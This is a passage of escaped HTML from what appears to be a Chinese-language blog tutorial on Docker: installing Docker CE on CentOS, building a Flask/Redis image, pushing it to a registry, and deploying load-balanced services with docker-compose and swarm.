class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version:<span class=\"string\">\"3\"</span></span><br><span class=\"line\">services:</span><br><span class=\"line\">  web:</span><br><span class=\"line\">    <span class=\"comment\"># 将 username/repo:tag 替换为您的名称和镜像详细信息</span></span><br><span class=\"line\">    image: username/repository:tag</span><br><span class=\"line\">    deploy:</span><br><span class=\"line\">      replicas:5</span><br><span class=\"line\">      resources:</span><br><span class=\"line\">        limits:</span><br><span class=\"line\">          cpus:<span class=\"string\">\"0.1\"</span></span><br><span class=\"line\">          memory:50M</span><br><span class=\"line\">      restart_policy:</span><br><span class=\"line\">        condition: on-failure</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - <span class=\"string\">\"80:80\"</span></span><br><span class=\"line\">    networks:</span><br><span class=\"line\">      - webnet</span><br><span class=\"line\">networks:</span><br><span class=\"line\">  webnet:</span><br></pre></td></tr></table></figure>\n<p><strong>此 docker-compose.yml 文件会告诉 Docker 执行以下操作：</strong></p>\n<ul>\n<li>从镜像库中拉取我们上传的镜像。</li>\n<li>将该镜像的五个实例作为服务<code>web</code>运行，并将每个实例限制为最多使用 10% 的 CPU（在所有核心中）以及 50MB RAM。</li>\n<li>如果某个容器发生故障，立即重启容器。</li>\n<li>将主机上的端口 80 映射到 web 的端口 80。</li>\n<li>指示<code>web</code>容器通过负载均衡的网络<code>webnet</code>共享端口 80。（在内部，容器自身将在临时端口发布到 web 的端口 80。）</li>\n<li>使用默认设置定义<code>webnet</code>网络（此为负载均衡的<code>overlay</code>网络）。</li>\n</ul>\n<h3 id=\"运行新的负载均衡-load-balanced-的应用\"><a href=\"#运行新的负载均衡-load-balanced-的应用\" class=\"headerlink\" title=\"运行新的负载均衡(load-balanced)的应用\"></a>运行新的负载均衡(load-balanced)的应用</h3><p><strong>需要先运行以下命令，然后才能使用<code>docker stack deploy</code>命令：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker swarm init</span><br></pre></td></tr></table></figure></p>\n<p><strong>现在，运行此命令。您必须为应用指定一个名称。在此处该名称设置为<code>getstartedlab</code>：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看您刚才启动的五个容器的列表：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack ps getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"/images/docker1.png\" alt=\"\"></p>\n<p><strong>您可以多次在一行中运行<code>curl http://localhost</code>，也可以在浏览器中转至该 URL 并多次点击“刷新”。无论采用哪种方式，您都将看到容器 ID 更改，从而说明负载均衡；借助每项请求，将以循环方式选择五个从节点之一做出响应。</strong></p>\n<blockquote>\n<p><strong>注：在此阶段，容器最多可能需要 30 秒来响应 HTTP 请求。这并不代表 Docker 或 swarm 的性能，而是一项未满足的 Redis 依赖关系，我们稍后将在本教程中讨论此依赖关系。</strong></p>\n</blockquote>\n<h3 id=\"扩展应用\"><a href=\"#扩展应用\" class=\"headerlink\" title=\"扩展应用\"></a>扩展应用</h3><p><strong>您可以通过在<code>docker-compose.yml</code>中更改<code>replicas</code>值，保存更改并重新运行<code>docker stack deploy</code>命令来扩展应用：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><strong>Docker 将执行原地更新，而无需先清除技术栈或终止任何容器。</strong><br><strong>现在，重新运行<code>docker stack ps</code>命令以查看经过重新配置的已部署实例。例如，如果您扩展了从节点，将有更多处于运行状态的容器。</strong></p>\n<h3 id=\"清除应用和-swarm\"><a href=\"#清除应用和-swarm\" class=\"headerlink\" title=\"清除应用和 swarm\"></a>清除应用和 swarm</h3><p><strong>使用<code>docker stack rm</code>清除应用：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack rm getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><strong>这将删除应用，但我们的单节点<code>swarm</code>仍处于正常运行状态（如<code>docker node ls</code>所示）。使用<code>docker swarm leave --force</code>清除 swarm。</strong></p>\n<h3 id=\"速查表-1\"><a href=\"#速查表-1\" class=\"headerlink\" title=\"速查表\"></a>速查表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack ls              <span class=\"comment\"># 列出此 Docker 主机上所有正在运行的应用</span></span><br><span class=\"line\">docker stack deploy -c &lt;composefile&gt; &lt;appname&gt;  <span class=\"comment\"># 运行指定的 Compose 文件</span></span><br><span class=\"line\">docker stack services &lt;appname&gt;       <span class=\"comment\"># 列出与应用关联的服务</span></span><br><span class=\"line\">docker stack ps &lt;appname&gt;   <span class=\"comment\"># 列出与应用关联的正在运行的容器</span></span><br><span class=\"line\">docker stack rm &lt;appname&gt;                             <span class=\"comment\"># 清除应用</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Swarm\"><a href=\"#Swarm\" class=\"headerlink\" title=\"Swarm\"></a>Swarm</h2><p>引用<a href=\"https://docs.docker-cn.com/get-started/part4/\" target=\"_blank\" rel=\"external\">Docker中文文档 Swarm</a></p>\n<h2 id=\"技术栈\"><a href=\"#技术栈\" class=\"headerlink\" title=\"技术栈\"></a>技术栈</h2><p>引用<a href=\"https://docs.docker-cn.com/get-started/part5/\" target=\"_blank\" rel=\"external\">Docker中文文档 技术栈</a></p>\n<h2 id=\"引用链接\"><a href=\"#引用链接\" class=\"headerlink\" title=\"引用链接\"></a>引用链接</h2><ul>\n<li><a href=\"https://www.docker-cn.com/what-docker\" target=\"_blank\" rel=\"external\">Docker中文</a></li>\n<li><a href=\"https://docs.docker.com/engine/installation/linux/docker-ce/centos/\" target=\"_blank\" rel=\"external\">Get Docker CE for CentOS</a></li>\n<li><a href=\"https://docs.docker.com/get-started/\" target=\"_blank\" rel=\"external\">Docker官网文档</a></li>\n<li><a href=\"https://docs.docker-cn.com/get-started/part3/\" target=\"_blank\" rel=\"external\">Docker 服务</a></li>\n</ul>\n","excerpt":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p><strong>Docker 是世界领先的软件容器平台。开发人员利用 Docker 可以消除协作编码”在我的机器上可正常工作”的问题。运维人员利用 Docker 可以在隔离容器中并行运行和管理应用，获得更好的计算密度。企业利用 Docker 可以构建敏捷的软件交付管道，以更快的速度、更高的安全性和可靠的信誉为 Linux 和 Windows Server 应用发布新功能。</strong><br><strong><a href=\"https://www.docker-cn.com/what-docker\">更加全面的介绍</a></strong><br>","more":"</p>\n<h2 id=\"容器\"><a href=\"#容器\" class=\"headerlink\" title=\"容器\"></a>容器</h2><p><strong><code>image</code>是一个轻量级的，独立的可执行程序包，包含运行一个软件所需的所有东西，包括代码，运行时库，环境变量和配置文件。</strong><br><strong><code>container</code>是<code>image</code>的运行时实例 —- <code>image</code>在实际执行时在内存中变成的内容。默认情况下，它与主机环境完全隔离，只有在配置时才访问主机文件和端口。</strong><br><strong>容器(containers)在主机的内核上本地运行应用程序。它们比只能通过管理程序虚拟访问主机资源的虚拟机具有更好的性能特征。容器可以获得本地访问权限，每个容器都以独立的进程运行，不会花费比其他可执行文件更多的内存。</strong></p>\n<h2 id=\"虚拟机-vs-容器\"><a href=\"#虚拟机-vs-容器\" class=\"headerlink\" title=\"虚拟机 vs. 容器\"></a>虚拟机 vs. 容器</h2><h3 id=\"虚拟机架构\"><a href=\"#虚拟机架构\" class=\"headerlink\" title=\"虚拟机架构\"></a>虚拟机架构</h3><p><img src=\"https://www.docker.com/sites/default/files/VM%402x.png\" alt=\"\"><br><strong>虚拟机运行客户操作系统 —- 每个框中的操作系统层。这是资源密集型的，产生的磁盘映像和应用程序状态是操作系统设置。系统安装的依赖关系，操作系统安全补丁和其他易于丢失的东西，难以复制重用</strong></p>\n<h3 id=\"容器架构\"><a href=\"#容器架构\" class=\"headerlink\" title=\"容器架构\"></a>容器架构</h3><p><img src=\"https://www.docker.com/sites/default/files/Container%402x.png\" alt=\"\"><br><strong>容器可以共享一个内核，并且唯一需要在容器镜像中的信息是可执行文件及其包依赖关系(the only information that needs to be in a container image is the executable and its package dependencies)，它们永远不需要安装在主机系统上。这些进程像本地进程一样运行，你可以像<code>docker ps</code>一样运行命令来单独管理它们，就像在Linux上运行ps来查看活动进程一样。最后，因为它们包含了所有的依赖关系，所以没有配置纠缠。一个集装箱化的应用程序”随处运行”</strong></p>\n<h2 id=\"安装Docker\"><a href=\"#安装Docker\" class=\"headerlink\" title=\"安装Docker\"></a>安装Docker</h2><h3 id=\"卸载旧版本\"><a href=\"#卸载旧版本\" class=\"headerlink\" title=\"卸载旧版本\"></a>卸载旧版本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum remove docker \\</span><br><span class=\"line\">                  docker-common \\</span><br><span class=\"line\">                  docker-selinux \\</span><br><span class=\"line\">                  docker-engine</span><br></pre></td></tr></table></figure>\n<h3 id=\"安装Docker-CE-Community-Edition\"><a href=\"#安装Docker-CE-Community-Edition\" class=\"headerlink\" title=\"安装Docker CE(Community Edition)\"></a>安装Docker CE(Community Edition)</h3><h4 id=\"软件库安装\"><a href=\"#软件库安装\" class=\"headerlink\" title=\"软件库安装\"></a>软件库安装</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install -y yum-utils \\</span><br><span class=\"line\">  device-mapper-persistent-data \\</span><br><span class=\"line\">  lvm2</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo yum install docker-ce</span><br></pre></td></tr></table></figure>\n<h4 id=\"开启Docker\"><a href=\"#开启Docker\" class=\"headerlink\" title=\"开启Docker\"></a>开启Docker</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo systemctl start docker</span><br></pre></td></tr></table></figure>\n<h4 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run hello-world</span><br><span class=\"line\"></span><br><span class=\"line\">Hello from Docker!</span><br><span class=\"line\">This message shows that your installation appears to be working correctly.</span><br><span class=\"line\"></span><br><span class=\"line\">To generate this message, Docker took the following steps:</span><br><span class=\"line\">...(snipped)...</span><br></pre></td></tr></table></figure>\n<h2 id=\"Building-an-app\"><a href=\"#Building-an-app\" class=\"headerlink\" title=\"Building an app\"></a>Building an app</h2><p><strong>现在是开始构建Docker方式的应用程序的时候了。我们将从这个应用程序的层次结构的底部开始，这个应用程序是一个容器。在这个层次上面是一个服务，它定义了容器在生产中的行为方式。最后，在顶层是堆栈，定义了所有服务的交互。</strong><br><strong>过去，如果你要开始编写一个Python应用程序，你的第一步就是在你的机器上安装一个Python运行库。但是，这会造成您的机器上的环境必须如此以使您的应用程序按预期运行。</strong></p>\n<p><strong>使用Docker，您可以将一个可移植的Python运行时作为一个镜像来获取，无需安装。然后，您的构建可以将基础Python镜像与应用程序代码一起包括在内，确保您的应用程序和依赖项一起运行。</strong><br><strong>这个可移植的镜像被定义为<code>Dockerfile</code></strong></p>\n<h3 id=\"Dockerfile\"><a href=\"#Dockerfile\" class=\"headerlink\" title=\"Dockerfile\"></a><code>Dockerfile</code></h3><p><strong>创建一个空的目录，cd进入空目录，创建一个<code>Dockerfile</code>文件,<code>requirement.txt</code>文件,<code>app.py</code>文件</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Use an official Python runtime as a parent image</span></span><br><span class=\"line\">FROM python:2.7-slim</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Set the working directory to /app</span></span><br><span class=\"line\">WORKDIR /app</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Copy the current directory contents into the container at /app</span></span><br><span class=\"line\">ADD . /app</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Install any needed packages specified in requirements.txt</span></span><br><span class=\"line\">RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Make port 80 available to the world outside this container</span></span><br><span class=\"line\">EXPOSE 80</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define environment variable</span></span><br><span class=\"line\">ENV NAME World</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Run app.py when the container launches</span></span><br><span class=\"line\">CMD [<span class=\"string\">\"python\"</span>, <span class=\"string\">\"app.py\"</span>]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"requirements-txt\"><a href=\"#requirements-txt\" class=\"headerlink\" title=\"requirements.txt\"></a><code>requirements.txt</code></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flask</span><br><span class=\"line\">Redis</span><br></pre></td></tr></table></figure>\n<h3 id=\"app-py\"><a href=\"#app-py\" class=\"headerlink\" title=\"app.py\"></a><code>app.py</code></h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> redis <span class=\"keyword\">import</span> Redis, RedisError</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Connect to Redis</span></span><br><span class=\"line\">redis = Redis(host=<span class=\"string\">\"redis\"</span>, db=<span class=\"number\">0</span>, socket_connect_timeout=<span class=\"number\">2</span>, socket_timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/\")</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        visits = redis.incr(<span class=\"string\">\"counter\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> RedisError:</span><br><span class=\"line\">        visits = <span class=\"string\">\"&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    html = <span class=\"string\">\"&lt;h3&gt;Hello &#123;name&#125;!&lt;/h3&gt;\"</span> \\</span><br><span class=\"line\">           <span class=\"string\">\"&lt;b&gt;Hostname:&lt;/b&gt; &#123;hostname&#125;&lt;br/&gt;\"</span> \\</span><br><span class=\"line\">           <span class=\"string\">\"&lt;b&gt;Visits:&lt;/b&gt; &#123;visits&#125;\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html.format(name=os.getenv(<span class=\"string\">\"NAME\"</span>, <span class=\"string\">\"world\"</span>), hostname=socket.gethostname(), visits=visits)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>, port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n<p><strong>使用命令创建一个Docker镜像</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker build -t friendlyhello .</span><br><span class=\"line\">$ docker images</span><br><span class=\"line\"></span><br><span class=\"line\">REPOSITORY            TAG                 IMAGE ID</span><br><span class=\"line\">friendlyhello         latest              326387cea398</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Run-the-app\"><a href=\"#Run-the-app\" class=\"headerlink\" title=\"Run the app\"></a>Run the app</h2><p><strong>运行应用程序，使用-p将您的机器的端口4000映射到容器的已发布端口80：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run -p 4000:80 friendlyhello</span><br></pre></td></tr></table></figure></p>\n<p><strong>你应该看到一条消息，Python在<code>http://0.0.0.0:80</code>上提供你的应用程序。但是，这个消息来自容器内部，它不知道你将该容器的端口80映射到4000，所以正确的URL为<code>http://localhost:4000</code>。</strong><br><strong>在Web浏览器中转到该URL以查看网页上显示的显示内容，包括“Hello World”文本，容器标识和Redis错误消息。</strong><br><img src=\"https://docs.docker.com/get-started/images/app-in-browser.png\" alt=\"\"></p>\n<p><strong>现在让我们以分离模式在后台运行应用程序：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run <span class=\"_\">-d</span> -p 4000:80 friendlyhello</span><br></pre></td></tr></table></figure></p>\n<p><strong>你得到你的应用程序的长容器ID，然后被踢回你的终端。您的容器正在后台运行。您还可以使用<code>docker container ls</code>查看缩略容器标识</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker container ls</span><br><span class=\"line\">CONTAINER ID        IMAGE               COMMAND             CREATED</span><br><span class=\"line\">1fa4ab2cf395        friendlyhello       <span class=\"string\">\"python app.py\"</span>     28 seconds ago</span><br></pre></td></tr></table></figure></p>\n<p><strong>现在使用<code>docker container stop</code>来结束进程，使用CONTAINER ID，如下所示：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker container stop 1fa4ab2cf395</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Share-your-image\"><a href=\"#Share-your-image\" class=\"headerlink\" title=\"Share your image\"></a>Share your image</h2><p><strong>为了演示我们刚刚创建的容器的可移植性，我们上传我们构建的映像，并在其他地方运行它。毕竟，当你想将容器部署到生产环境时，你需要学习如何<code>push</code>到一个公共地方。</strong><br><strong>如果你还没有Docker帐号，需要在<a href=\"https://cloud.docker.com/\">这里</a>注册一个帐号</strong><br><strong>本地登录你的Docker库</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker login</span><br></pre></td></tr></table></figure></p>\n<p><strong>关联本地镜像像与注册表(registry)中存储库的符号是<code>username/repository:tag</code>。该标签是可选的，但推荐使用，因为这是注册管理机构管理Docker镜像版本的机制。给存储库标记有意义的名字，比如<code>get-started:part2</code>。这会将镜像放入<code>get-started</code>存储库中，并将其标记为<code>part2</code>。</strong><br><strong>现在，把它们放在一起来标记镜像。使用您的用户名，存储库和标签名称运行<code>docker tag image</code>，以便将镜像上传到您想要的目的地。该命令的语法是:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker tag image username/repository:tag</span><br></pre></td></tr></table></figure></p>\n<p><strong>For example:</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker tag friendlyhello john/get-started:part2</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看你新标记的镜像</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker images</span><br><span class=\"line\">REPOSITORY               TAG                 IMAGE ID            CREATED             SIZE</span><br><span class=\"line\">friendlyhello            latest              d9e555c53008        3 minutes ago       195MB</span><br><span class=\"line\">john/get-started         part2               d9e555c53008        3 minutes ago       195MB</span><br><span class=\"line\">python                   2.7-slim            1c7128a655f6        5 days ago          183MB</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure></p>\n<p><strong>发布镜像</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker push username/repository:tag</span><br></pre></td></tr></table></figure></p>\n<p><strong>拉取并运行远端库</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -p 4000:80 username/repository:tag</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"速查表\"><a href=\"#速查表\" class=\"headerlink\" title=\"速查表\"></a>速查表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t friendlyname .<span class=\"comment\"># 使用此目录的 Dockerfile 创建镜像</span></span><br><span class=\"line\">docker run -p 4000:80 friendlyname  <span class=\"comment\"># 运行端口 4000 到 90 的“友好名称”映射</span></span><br><span class=\"line\">docker run <span class=\"_\">-d</span> -p 4000:80 friendlyname         <span class=\"comment\"># 内容相同，但在分离模式下</span></span><br><span class=\"line\">docker ps                                 <span class=\"comment\"># 查看所有正在运行的容器的列表</span></span><br><span class=\"line\">docker stop &lt;<span class=\"built_in\">hash</span>&gt;                     <span class=\"comment\"># 平稳地停止指定的容器</span></span><br><span class=\"line\">docker ps <span class=\"_\">-a</span>           <span class=\"comment\"># 查看所有容器的列表，甚至包含未运行的容器</span></span><br><span class=\"line\">docker <span class=\"built_in\">kill</span> &lt;<span class=\"built_in\">hash</span>&gt;                   <span class=\"comment\"># 强制关闭指定的容器</span></span><br><span class=\"line\">docker rm &lt;<span class=\"built_in\">hash</span>&gt;              <span class=\"comment\"># 从此机器中删除指定的容器</span></span><br><span class=\"line\">docker rm $(docker ps <span class=\"_\">-a</span> -q)           <span class=\"comment\"># 从此机器中删除所有容器</span></span><br><span class=\"line\">docker images <span class=\"_\">-a</span>                               <span class=\"comment\"># 显示此机器上的所有镜像</span></span><br><span class=\"line\">docker rmi &lt;imagename&gt;            <span class=\"comment\"># 从此机器中删除指定的镜像</span></span><br><span class=\"line\">docker rmi $(docker images -q)             <span class=\"comment\"># 从此机器中删除所有镜像</span></span><br><span class=\"line\">docker login             <span class=\"comment\"># 使用您的 Docker 凭证登录此 CLI 会话</span></span><br><span class=\"line\">docker tag &lt;image&gt; username/repository:tag  <span class=\"comment\"># 标记 &lt;image&gt; 以上传到镜像库</span></span><br><span class=\"line\">docker push username/repository:tag            <span class=\"comment\"># 将已标记的镜像上传到镜像库</span></span><br><span class=\"line\">docker run username/repository:tag                   <span class=\"comment\"># 运行镜像库中的镜像</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"服务\"><a href=\"#服务\" class=\"headerlink\" title=\"服务\"></a>服务</h2><h3 id=\"了解服务\"><a href=\"#了解服务\" class=\"headerlink\" title=\"了解服务\"></a>了解服务</h3><p><strong>在分布式应用中，应用的不同部分称为“服务”。例如，假设有一个视频共享网站，它可能提供用于在数据库中存储应用程序数据的服务、用于在用户上传一些内容后在后台进行视频转码的服务、用于前端的服务等。</strong></p>\n<p><strong>服务实际上是“生产中的容器”。一项服务仅运行一个镜像，但它会编制镜像的运行方式 - 它应使用的端口、容器的多少个从节点应运行才能使服务的容量满足其需求等。扩展服务将更改运行该软件的容器实例数，并将多个计算资源分配给进程中的服务。</strong></p>\n<p><strong>幸运的是，很容易使用 Docker 平台定义、运行和扩展服务 – 只需编写一个<code>docker-compose.yml</code>文件即可。</strong></p>\n<h3 id=\"docker-compose-yml\"><a href=\"#docker-compose-yml\" class=\"headerlink\" title=\"docker-compose.yml\"></a><code>docker-compose.yml</code></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version:<span class=\"string\">\"3\"</span></span><br><span class=\"line\">services:</span><br><span class=\"line\">  web:</span><br><span class=\"line\">    <span class=\"comment\"># 将 username/repo:tag 替换为您的名称和镜像详细信息</span></span><br><span class=\"line\">    image: username/repository:tag</span><br><span class=\"line\">    deploy:</span><br><span class=\"line\">      replicas:5</span><br><span class=\"line\">      resources:</span><br><span class=\"line\">        limits:</span><br><span class=\"line\">          cpus:<span class=\"string\">\"0.1\"</span></span><br><span class=\"line\">          memory:50M</span><br><span class=\"line\">      restart_policy:</span><br><span class=\"line\">        condition: on-failure</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - <span class=\"string\">\"80:80\"</span></span><br><span class=\"line\">    networks:</span><br><span class=\"line\">      - webnet</span><br><span class=\"line\">networks:</span><br><span class=\"line\">  webnet:</span><br></pre></td></tr></table></figure>\n<p><strong>此 docker-compose.yml 文件会告诉 Docker 执行以下操作：</strong></p>\n<ul>\n<li>从镜像库中拉取我们上传的镜像。</li>\n<li>将该镜像的五个实例作为服务<code>web</code>运行，并将每个实例限制为最多使用 10% 的 CPU（在所有核心中）以及 50MB RAM。</li>\n<li>如果某个容器发生故障，立即重启容器。</li>\n<li>将主机上的端口 80 映射到 web 的端口 80。</li>\n<li>指示<code>web</code>容器通过负载均衡的网络<code>webnet</code>共享端口 80。（在内部，容器自身将在临时端口发布到 web 的端口 